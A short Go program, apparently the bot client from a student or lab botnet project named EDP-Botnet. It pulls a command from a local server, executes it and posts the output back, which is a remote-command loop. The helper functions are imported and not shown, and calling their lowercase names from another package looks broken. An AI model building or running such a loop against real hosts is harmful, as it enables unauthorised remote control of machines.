package main

import(
  "fmt"
  "github.com/grisufrj/EDP-Botnet/ExecutingSlave"
)

func main(){
  url := "http://localhost:5000"
  comando := ExecutingSlave.recv_cmd(url+"/command")
  resp := ExecutingSlave.exec_cmd(comando)
  status:= ExecutingSlave.send_cmd(url+"/send",resp)
  fmt.Println(status)
}
